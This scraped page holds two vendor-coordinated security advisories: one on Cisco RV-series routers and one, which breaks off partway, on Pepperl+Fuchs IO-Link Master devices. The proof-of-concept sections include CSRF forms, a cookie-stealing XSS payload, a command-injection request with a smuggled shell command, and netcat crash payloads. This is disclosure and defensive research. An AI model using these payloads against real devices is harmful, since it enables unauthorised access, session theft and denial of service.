* [Supplier Responsibility](https://www.broadcom.com/company/citizenship/supplier-responsibility)
* [Terms of Use](https://www.broadcom.com/company/legal/terms-of-use)
* [Site Map](https://www.broadcom.com/sitemap)



=== Content from seclists.org_58efb052_20250125_072700.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20190904-0 :: Multiple vulnerabilities in Cisco router series RV34X, RV26X and RV16X

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Wed, 4 Sep 2019 23:20:24 +0200

---

```
SEC Consult Vulnerability Lab Security Advisory < 20190904-0 >
=======================================================================
              title: Multiple vulnerabilities
            product: Cisco RV340, Cisco RV340W, Cisco RV345, Cisco RV345P,
                     Cisco RV260, Cisco RV260P, Cisco RV260W, Cisco 160,
                     Cisco 160W
 vulnerable version: Cisco RV34X - 1.0.02.16, Cisco RV16X/26X - 1.0.00.15
      fixed version: see "Solution"
         CVE number: -
             impact: High
           homepage: <https://www.cisco.com/>
              found: 2019-05-15
                 by: T. Weber, S. Viehböck (Office Vienna)
                     IoT Inspector
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"Securely connecting your small business to the outside world is as important
as connecting your internal network devices to one another. Cisco Small
Business RV Series Routers offer virtual private networking (VPN) technology
so your remote workers can connect to your network through a secure Internet
pathway."

Source: <https://www.cisco.com/c/en/us/products/routers/small-business-rv-series-routers/index.html>

Business recommendation:
------------------------
We want to thank Cisco for the very quick and professional response and great
coordination. Customers are urged to update the firmware of their devices.

Vulnerability overview/description:
-----------------------------------
1) Hardcoded Credentials
The device contains hardcoded users and passwords which can be used to login
via SSH on an emulated device at least.

During the communication with Cisco it turned out that:
"Accounts like the 'debug-admin' and 'root' can not be accessed
from console port, CLI or webui".
Therefore, these accounts had no real functionality and cannot be used for
malicious actions.

2) Known GNU glibc Vulnerabilities
The used GNU glibc in version 2.19 is outdated and contains multiple known
vulnerabilities. The outdated version was found by IoT Inspector. One of
the discovered vulnerabilities (CVE-2015-7547, "getaddrinfo() buffer overflow")
was verified by using the MEDUSA scalable firmware runtime.

3) Known BusyBox Vulnerabilities
The used BusyBox toolkit in version 1.23.2 is outdated and contains multiple
known vulnerabilities. The outdated version was found by IoT Inspector.
One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scaleable firmware runtime.

4) Multiple Vulnerabilities - IoT Inspector Report
Further information can be found in IoT Inspector report:
<https://r.sec-consult.com/ciscoiot>

Proof of concept:
-----------------
1) Hardcoded Credentials
The following hardcoded hashes were found in the 'shadow' file of the firmware:
root:$1$hPNSjUZA$7eKqEpqVYltt9xJ6f0OGf0:15533:0:99999:7:::
debug-admin:$1$.AAm0iJ4$na9wZwly9pSrdS8MhcGKw/:15541:0:99999:7:::
[...]

The undocumented user 'debug-admin' is also contained in this file.

Starting the dropbear daemon as background process on emulated firmware:
-------------------------------------------------------------------------------
# dropbear -E
# [1109] <timestamp> Running in background
#
# [1112] <timestamp> Child connection from <IP>:52718
[1112] <timestamp> /var must be owned by user or root, and not writable by others
[1112] <timestamp> Password auth succeeded for 'debug-admin' from <IP>:52718
-------------------------------------------------------------------------------

Log on via another host connected to the same network. For this PoC the
password of the debug-admin was changed in the 'shadow' file.
-------------------------------------------------------------------------------
[root@localhost medusa]# ssh debug-admin@<IP> /bin/ash -i
debug-admin@<IP>'s password:
/bin/ash: can't access tty; job control turned off

BusyBox v1.23.2 (2018-11-21 18:22:56 IST) built-in shell (ash)

/tmp $
-------------------------------------------------------------------------------

The 'debug-admin' user has the same privileges like 'root'. This can be
determined from the corresponding sudoers file in the firmware:
[...]
## User privilege specification
##
root ALL=(ALL) ALL
debug-admin ALL=(ALL) ALL

## Uncomment to allow members of group wheel to execute any command
# %wheel ALL=(ALL) ALL
[...]

During the communication with Cisco it turned out that:
"Accounts like the 'debug-admin' and 'root' can not be accessed
from console port, CLI or webui".
Therefore, these accounts had no real functionality and cannot be used for
malicious actions.

2) Known GNU glibc Vulnerabilities
GNU glibc version 2.19 contains multiple CVEs like:
CVE-2014-4043, CVE-2014-9402, CVE-2014-9761, CVE-2014-9984, CVE-2015-1472,
CVE-2015-5277, CVE-2015-8778, CVE-2015-8779, CVE-2017-1000366 and more.

The getaddrinfo() buffer overflow vulnerability was checked with the help of
the exploit code from <https://github.com/fjserna/CVE-2015-7547>. It was compiled
and executed on the emulated device to test the system.

# python cve-2015-7547-poc.py &
[1] 961
# chroot /medusa_rootfs/ bin/ash

BusyBox v1.23.2 (2018-11-21 18:22:56 IST) built-in shell (ash)

# gdb cve-2015-7547_glibc_getaddrinfo
[...]
[UDP] Total Data len recv 36
[UDP] Total Data len recv 36
Connected with 127.0.0.1:41782
[TCP] Total Data len recv 76
[TCP] Request1 len recv 36
[TCP] Request2 len recv 36
Cannot access memory at address 0x4

Program received signal SIGSEGV, Segmentation fault.
0x76f1fd58 in ?? () from /lib/libc.so.6
(gdb)

References:
<https://security.googleblog.com/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html>
<https://github.com/fjserna/CVE-2015-7547>

3) Known BusyBox Vulnerabilities
BusyBox version 1.23.2 contains multiple CVEs like:
CVE-2016-2148, CVE-2016-6301, CVE-2015-9261, CVE-2016-2147, CVE-2018-20679,
CVE-2017-16544 and CVE-2019-5747.
The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device:

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

4) Multiple Vulnerabilities - IoT Inspector Report
Further information can be found in IoT Inspector report:
<https://r.sec-consult.com/ciscoiot>

The summary is below:
IoT Inspector Vulnerability #1 BusyBox CVE entries
Outdated BusyBox version is affected by 7 published CVEs.

IoT Inspector Vulnerability #2 curl CVE entries
Outdated curl version is affected by 35 published CVEs.

IoT Inspector Vulnerability #3 GNU glibc CVE entries
Outdated GNU glibc version is affected by 44 published CVEs.

IoT Inspector Vulnerability #4 GNU glibc getaddrinfo() buffer overflow
Outdated GNU glibc version is affected by CVE-2015-7547.

IoT Inspector Vulnerability #5 Hardcoded password hashes
Firmware contains multiple hardcoded credentials.

IoT Inspector Vulnerability #6 Linux Kernel CVE entries
Outdated Linux Kernel version affected by 512 published CVEs.

IoT Inspector Vulnerability #7 MiniUPnPd CVE entries
Outdated MiniUPnPd version affected by 2 published CVEs.

IoT Inspector Vulnerability #8 Dnsmasq CVE entries
Outdated MiniUPnPd version affected by 1 published CVE.

IoT Inspector Vulnerability #9 Linux Kernel Privilege Escalation “pp_key”
Outdated Linux Kernel version is affected by CVE-2015-7547.

IoT Inspector Vulnerability #10 OpenSSL CVE entries
Outdated OpenSSL  version affected by 6 published CVEs.

Vulnerable / tested versions:
-----------------------------
The following firmware versions have been tested with IoT Inspector and
firmware emulation techniques:
Cisco RV340  / 1.0.02.16
Cisco RV340W / 1.0.02.16
Cisco RV345  / 1.0.02.16
Cisco RV345P / 1.0.02.16
The following firmware versions have been tested with IoT Inspector only:
Cisco RV260  / 1.0.00.15
Cisco RV260P / 1.0.00.15
Cisco RV260W / 1.0.00.15
Cisco RV160  / 1.0.00.15
Cisco RV160P / 1.0.00.15

The firmware was obtained from the vendor website:
<https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.02.16>
<https://software.cisco.com/download/home/286316464/type/282465789/release/1.0.00.15>

Vendor contact timeline:
------------------------
2019-05-15: Contacting vendor through psirt () cisco com.
2019-05-16: Vendor confirmed the receipt.
2019-05-2019-08: Periodic updates about the investigation from the vendor.
            Clarification which of the reported issues will be fixed.
2019-08-20: The vendor proposed the next possible publication date for the
            advisory for 2019-09-04. The vendor added the RV160 and RV260
            router series to be vulnerable to the same issues too.
2019-09-04: Coordinated advisory release.

Solution:
---------
Upgrade to the newest available firmware version.

Additionally, the vendor provides the following security notice:
<https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190904-sb-vpnrouter>

Workaround:
-----------
None.

Advisory URL:
-------------
<https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab

SEC Consult
Europe | Asia | North America

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://www.sec-consult.com/en/career/index.html>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://www.sec-consult.com/en/contact/index.html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2019

```

**Attachment:
[smime.p7s](att-7/smime_p7s.bin)**

*Description:* S/MIME Cryptographic Signature

---

[![Previous](/images/left-icon-16x16.png)](6)
[By Date](date.html#7)
[![Next](/images/right-icon-16x16.png)](8)

[![Previous](/images/left-icon-16x16.png)](6)
[By Thread](index.html#7)
[![Next](/images/right-icon-16x16.png)](8)

### Current thread:

* **SEC Consult SA-20190904-0 :: Multiple vulnerabilities in Cisco router series RV34X, RV26X and RV16X** *SEC Consult Vulnerability Lab (Sep 04)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from seclists.org_566e0efc_20250125_072654.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](38)
[By Date](date.html#39)
[![Next](/images/right-icon-16x16.png)](40)

[![Previous](/images/left-icon-16x16.png)](38)
[By Thread](index.html#39)
[![Next](/images/right-icon-16x16.png)](40)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20210113-0 :: Multiple vulnerabilities in Pepperl+Fuchs IO-Link Master Series

---

*From*: SEC Consult Vulnerability Lab <research () sec-consult com>

*Date*: Wed, 13 Jan 2021 12:29:57 +0100

---

```
SEC Consult Vulnerability Lab Security Advisory < 20210113-0 >
=======================================================================
              title: Multiple vulnerabilities
            product: Pepperl+Fuchs IO-Link Master Series
                     See "Vulnerable / tested versions"
 vulnerable version: System 1.36 / Application 1.5.28
      fixed version: System 1.52 / Application 1.6.11
         CVE number: CVE-2020-12511, CVE-2020-12512, CVE-2020-12513,
                     CVE-2020-12514
             impact: High
           homepage: <https://www.pepperl-fuchs.com>
              found: 2020-04-23
                 by: T. Weber (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Atos company
                     Europe | Asia | North America

                     <https://www.sec-consult.com>

=======================================================================

Vendor description:
-------------------
"Automation is our world. Perfect application solutions are our goal.

In 1945, Walter Pepperl and Ludwig Fuchs founded a small radio workshop in
Mannheim, Germany, based on the principles of inventiveness, entrepreneurial
foresight, and self-reliance. The experience they acquired was transformed into
new ideas, and they continued to enjoy developing products for customers. The
eventual result was the invention of the proximity switch. This innovation rep-
resented the starting point of the company's success story.

Today, Pepperl+Fuchs is known by customers around the world as a pioneer and an
innovator in electrical explosion protection and sensor technology. Our main
focus is always on your individual requirements: With a passion for automation
and groundbreaking technology, we are committed to working in partnership with
you now and in the future. We understand the demands of your markets, develop-
ing specific solutions, and integrating them into your processes."

Source: <https://www.pepperl-fuchs.com/usa/en/25.htm>

Business recommendation:
------------------------
SEC Consult recommends to update the devices to the newest firmware packages
(System 1.36 / Application 1.5.28), where the documented issues are fixed
according to the vendor.

Vulnerability overview/description:
-----------------------------------
1) Cross-Site Request Forgery (CSRF) (CVE-2020-12511)
The web interface that is used to set all configurations, is vulnerable to
cross-site request forgery attacks. An attacker can change settings via this
way by luring the victim to a malicious website.

2) Authenticated Reflected POST Cross-Site Scripting (CVE-2020-12512)
An authenticated reflected cross-site scripting can be triggered by issuing a
POST request to the "/Software" endpoint which is available on the web-service.
An attacker can abuse these vulnerabilities to steal cookies from the attacked
user in order to log on to the device. An attacker is also able to perform
actions in the context of the attacked user.

3) Authenticated Blind Command Injection (CVE-2020-12513)
A command injection was identified in the web-interface. This vulnerability is
present because of unfiltered user input that is appended to a string which
gets executed with "exec()". Commands are executed as root user.

4) Null Pointer Dereference / DoS in "discoveryd" (CVE-2020-12514)
The discovery daemon ("discoveryd") is started during the bootup of the device.
The program is used for the network management program "PortVision DX". It is
designed with unsafe functions and is vulnerable to a DoS attack. This is
triggered due to a null dereference in strlen. A debug mode is also available in
the program. This can be activated by starting the discovery daemon with
"discoveryd -vv". All inputs are printed to the stdout during its execution
with this argument. This is not done in the productive device but can lead to
more severe attacks.

5) Outdated and Vulnerable Software Components
Outdated and vulnerable software components were found on the device during
a quick examination.

One of the discovered vulnerabilities (CVE-2017-16544) was verified by using
the MEDUSA scalable firmware runtime.

Proof of concept:
-----------------
1) Cross-Site Request Forgery (CSRF) (CVE-2020-12511)
The following PoC can be used to change the hostname of the device to "SEC-
Consult":
-------------------------------------------------------------------------------
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[https://$IP/configuration_tab/ajax_comb_table_save/network_config/network_config_schema"](https://$IP/configuration_tab/ajax_comb_table_save/network_config/network_config_schema%22);
method="POST">
      <input type="hidden" name="form"
value="Hostname&#61;SEC-Consult&amp;IPv4mode&#61;static&amp;IPv4address&#61;1&#46;1&#1;0&#1;1&amp;IPv4netmask&#61;255&#46;255&#46;255&#46;0&amp;IPv4gateway&#61;1&#46;1&#46;1&#1;2&amp;DNSmode&#61;manual&amp;IPv4DNS1&#61;&amp;IPv4DNS2&#61;&amp;IpAddrCnflctDetectEnbl&#61;enable&amp;NtpServer&#61;&amp;SyslogServer&#61;&amp;SyslogPort&#61;514&amp;SshServerEnable&#61;disable"
/>
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
-------------------------------------------------------------------------------

2) Authenticated Reflected POST Cross-Site Scripting (CVE-2020-12512)
By sending the following request to the web-service, a reflected cross-site
scripting vulnerability can be triggered:
-------------------------------------------------------------------------------
POST /Software HTTP/1.1
Host: $IP
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Connection: close
Cookie: ui_language=en_US; PHPSESSID=r7jtaceerqeijqr4b2dl0us814
Upgrade-Insecure-Requests: 1

language=german'><script>alert(document.cookie)</script>
-------------------------------------------------------------------------------
The server responds with the following content:
-------------------------------------------------------------------------------
HTTP/1.1 200 OK
X-Powered-By: PHP/5.6.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-type: text/html; charset=UTF-8
Content-Length: 11860
Connection: close
Date: Thu, 01 Jan 1970 00:59:46 GMT
Server: lighttpd/1.4.41

[...]

<div class="page-content">
  <div class="page-header">
   <h1>Software <a href='/assets/WebHelp/german'><script>alert(document.cookie)</script>/advanced/software.htm'
target='_blank'><img src='/assets/images/question_16.png' alt='Page-specific Help'></a></h1>
    <a class="latest-version" href="#">Check for latest version</a>
  </div>

[...]
-------------------------------------------------------------------------------

PoC-Exploit code for the cross-site scripting vulnerability:
-------------------------------------------------------------------------------
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="[http://$IP/Software"](http://$IP/Software%22); method="POST">
      <input type="hidden" name="language"
value="german&apos;&gt;&lt;script&gt;alert&#40;document&#46;cookie&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
-------------------------------------------------------------------------------

3) Authenticated Blind Command Injection (CVE-2020-12513)
By entering a command in the field "code" under the tab "IO-Link Test Event
Generation" on the endpoint "/Misc/Settings" that is surrounded by ";", it
gets executed. The following POST request to the web-service demonstrates this
with the command "ping 127.0.0.1":
-------------------------------------------------------------------------------
POST /index.php/ajax/generate_iolink_event/ HTTP/1.1
Host: $IP
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: <http://$IP/Misc/Settings>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 101
Connection: close
Cookie: ui_language=en_US; PHPSESSID=lh8d4g4e8fm9f1732j9g6bm3a0

mode=single&type=message&instance=unknown&source=local&pdivalid=valid&code=0x0000%3Bping+127.0.0.1%3B
-------------------------------------------------------------------------------

There is no response from the web-service which indicates to the attacker that
the command was executed. As this was tested on an emulated device only, the
commands were seen in the process list which proofed that it was executed
as root:

-bash-4.4# ps
PID   USER     COMMAND
[...]
  216 root     /usr/sbin/restoremonitor
  272 root     /usr/sbin/snmpd -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  333 root     /apps/bin/appmgr
  347 root     05discoverd
  349 root     11iolinkconfigd
  353 root     90netconfig-saved
  354 root     90netconfig-working
  385 root     lighttpd -f /apps/www/lighttpd.conf
  386 root     /usr/bin/php-cgi
  387 root     /usr/bin/php-cgi
  388 root     /usr/bin/php-cgi
  389 root     /usr/bin/php-cgi
  390 root     /usr/bin/php-cgi
  391 root     /usr/bin/php-cgi
  392 root     config waitcmd working network /apps/bin/updateLighttpdAuth
  395 root     /usr/bin/php-cgi
  397 root     -bash
  399 root     /usr/bin/php-cgi
  473 root     udhcpc -R -n -O search -p /var/run/udhcpc.eth0.pid -i eth0 -x ho
 2519 root     [kworker/u3:2]
 3173 root     sh -c injectEvent -m single -t message -i unknown -s local -v va
 3175 root     ping 127.0.0.1
 3509 root     50ethernetip
 3541 root     [10iolinkd]
 3544 root     ps

4) Null Pointer Dereference / DoS in "discoverd" (CVE-2020-12514)
Payload for triggering a segmentation fault (caused by a null pointer dereference):
$ echo -e "\xa9\x8d\xfd\x53\x03\x8a\x7c\x32\x00\x00\x02\x00\x0c\x00\x10\x10" | nc -u $IP 4606

Program received signal SIGSEGV, Segmentation fault.
0xb6f5dfb4 in strlen () from /lib/libc.so.0
(gdb)

Payload for writing ASCII characters in debug mode ("discoveryd -vv"). Register
R4 can be controlled via a byte (filled with value "\xab") also in normal mode
("discoveryd"):
$ echo -e
"\xa9\x8d\xfd\x53\x03\x8a\x7c\x32\x00\x00\x02\x01\x0c\x00\x10\xab\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63\x73\x65\x63"
 | nc -u $IP 4606

Program received signal SIGSEGV, Segmentation fault.
0xb6f5dfb4 in strlen () from /lib/libc.so.0
(gdb) i r
r0             0x0                 0
r1             0x0                 0
r2             0xbefffb9b          3204447131
r3             0x0                 0
r4             0xab                171
r5             0x1da               474
r6             0xb6f8dbee          3069762542
r7             0x0                 0
r8             0x0                 0
r9             0x0                 0
r10            0xb6ffef74          3070226292
r11            0xbefff574          3204445556
r12            0xb6f5dfb0          3069566896
sp             0xbefff558          0xbefff558
lr             0xaf9c              44956
pc             0xb6f5dfb4          0xb6f5dfb4 <strlen+4>
cpsr           0xa0000010          -1610612720
fpscr          0x0                 0

More bytes than in this payload will lead to another program execution path in
debug mode ("discoveryd -vv").
$ echo -e
"\xa9\x8d\xfd\x53\x03\x8a\x7c\x32\x00\x00\x02\x01\x0c\x00\x10\xab\x63\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
| nc -u $IP 4606

Other program paths, depending on the current memory, can be triggered with
this payload in debug mode due to printf:
$ echo -e
"\xa9\x8d\xfd\x53\x03\x8a\x7c\x32\x00\x00\x02\x01\x0c\x00\x10\xab\x63\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
| nc -u $IP 4606

In normal mode, only a null pointer dereference is triggered which leads to a
program crash.

5) Outdated and Vulnerable Software Components
* PHP 5.6.15
* lighttpd 1.4.41
* OpenSSL 1.0.2j
* Linux Kernel 2.6.30
* BusyBox 1.26.2

The BusyBox shell autocompletion vulnerability (CVE-2017-16544) was verified on
an emulated device:

A file with the name "\ectest\n\e]55;test.txt\a" was created to trigger the
vulnerability.
-------------------------------------------------------------------------------
# ls "pressing <TAB>"
test
]55;test.txt
#
-------------------------------------------------------------------------------

The vulnerabilities 1), 2), 3) and 4) were manually verified on an emulated
device by using the MEDUSA scalable firmware runtime.

Vulnerable / tested versions:
-----------------------------
The IO-Link Master devices are sharing the same firmware base. The
vulnerabilities were tested on an emulated firmware (system 1.36/ app EIP 1.5.28).

According to the vendor, all firmware versions below 1.5.48 are vulnerable:
IO-Link Master 4-EIP         / <=1.5.48
IO-Link Master 8-EIP         / <=1.5.48
IO-Link Master 8-EIP-L       / <=1.5.48
IO-Link Master DR-8-EIP      / <=1.5.48
IO-Link Master DR-8-EIP-P    / <=1.5.48
IO-Link Master DR-8-EIP-T    / <=1.5.48
